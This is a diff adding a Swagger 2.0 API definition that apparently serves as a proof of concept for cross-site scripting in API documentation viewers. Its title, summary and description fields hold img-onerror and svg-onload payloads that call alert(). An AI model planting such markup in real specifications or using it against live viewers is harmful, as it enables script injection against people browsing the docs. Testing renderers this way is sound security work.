@@ -1,0 +1,33 @@
+swagger: "2.0"
+info:
+  title: Classic API
+  description: |
+    <img src=x onerror=alert(document.domain)>
+  version: "1.0"
+host: sinarpagi.com
+basePath: /
+schemes:
+  - https
+produces:
+  - application/json
+consumes:
+  - application/json
+paths:
+  /test:
+    get:
+      tags:
+        - poc
+      summary: |
+        <img src=x onerror=alert('XSS dalam summary!')>
+      description: |
+        <svg/onload=alert('XSS di description!')>
+      parameters:
+        - name: id
+          in: query
+          description: |
+            <img src=x onerror=alert('XSS dari parameter!')>
+          required: false
+          type: string
+      responses:
+        '200':
+          description: OK
